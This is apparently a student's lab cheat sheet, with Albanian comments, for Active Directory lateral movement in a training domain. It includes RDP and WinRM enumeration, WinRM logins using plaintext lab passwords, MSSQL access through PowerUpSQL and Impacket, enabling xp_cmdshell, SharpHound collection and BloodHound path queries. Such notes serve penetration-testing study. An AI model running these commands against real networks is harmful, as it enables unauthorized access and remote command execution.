
```bash
# 🔍 Enumerim i përdoruesve me akses RDP
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

# 🔌 Lidhje me WinRM nga Windows
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

# 🗄 Enumerim MSSQL me PowerUpSQL
Import-Module .\\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\\damundsen" -password "SQL1234!" -query 'SELECT @@version'

# 🐍 Lidhje me Evil-WinRM nga Linux
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend

# 🛠 Përdorimi i mssqlclient.py (Impacket)
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth

# ⚙ Aktivizimi i xp_cmdshell në MSSQL
-- Aktivizon ekzekutimin e komandave OS nga SQL Server
enable_xp_cmdshell

# Enumerimi i perdoruesve qe kan privilegje RDP blodhound
.\\sharpHound.exe -c All

# Gjejm per doruesit qe kan akses ne databaze si admin
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
# Pastaj mund te perdorim mssqlclient.py per tu lidhur.

# Gjejm perdoruesi qe kan akses CanPSRemote
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p
```